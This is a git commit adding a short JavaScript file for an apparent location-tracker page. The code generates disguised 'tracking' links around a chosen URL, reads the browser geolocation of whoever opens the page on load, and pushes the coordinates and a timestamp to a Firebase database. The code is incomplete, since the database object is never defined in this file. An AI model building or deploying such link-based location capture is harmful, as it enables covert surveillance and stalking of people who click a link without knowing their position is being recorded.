e4d6653b23e75c974e9f617cfabe2a22f55e29ee
lavinia0cristine0souza <101836802+lavinia0cristine0souza@users.noreply.github.com>
2025-03-24 00:11:32 -0300

    script.js

---
+++ script.js
@@ -0,0 +1,35 @@
+const urlInput = document.getElementById('urlInput');
+const createLinkButton = document.getElementById('createLinkButton');
+const trackingLink = document.getElementById('trackingLink');
+
+createLinkButton.addEventListener('click', () => {
+    const url = urlInput.value;
+    const trackingId = generateTrackingId();
+    const trackingUrl = `https://lavinia0cristine0souza.github.io/rastreador-localizacao/track?id=${trackingId}&url=${encodeURIComponent(url)}`;
+    trackingLink.textContent = trackingUrl;
+});
+
+function generateTrackingId() {
+    return Math.random().toString(36).substring(2, 15);
+}
+
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+            const { latitude, longitude } = position.coords;
+            sendLocationToFirebase(latitude, longitude);
+        });
+    }
+}
+
+function sendLocationToFirebase(latitude, longitude) {
+    database.ref('locations/').push({
+        latitude: latitude,
+        longitude: longitude,
+        timestamp: Date.now()
+    });
+}
+
+window.onload = function() {
+    getLocation();
+};
